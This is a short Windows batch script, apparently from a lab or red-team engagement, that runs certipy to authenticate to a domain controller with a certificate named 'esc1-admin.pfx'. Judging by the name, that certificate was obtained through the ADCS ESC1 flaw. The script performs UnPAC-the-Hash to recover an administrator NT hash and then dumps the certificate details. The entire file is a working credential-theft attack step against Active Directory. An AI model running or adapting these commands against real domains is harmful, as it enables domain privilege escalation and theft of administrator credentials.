@echo off
REM Branch B WT053 UnPAC-the-Hash — certipy auth without -username override
cd /d C:\Tools\cadre-attack
set PY=C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts
set PYTHONIOENCODING=utf-8

echo === certipy auth (UPN from cert) ===
%PY%\certipy.exe auth -pfx esc1-admin.pfx -dc-ip 192.168.77.10 2>&1
echo AUTH_RC %ERRORLEVEL%
dir esc1-admin.hash 2>&1

echo === check cert details ===
%PY%\certipy.exe cert -pfx esc1-admin.pfx 2>&1
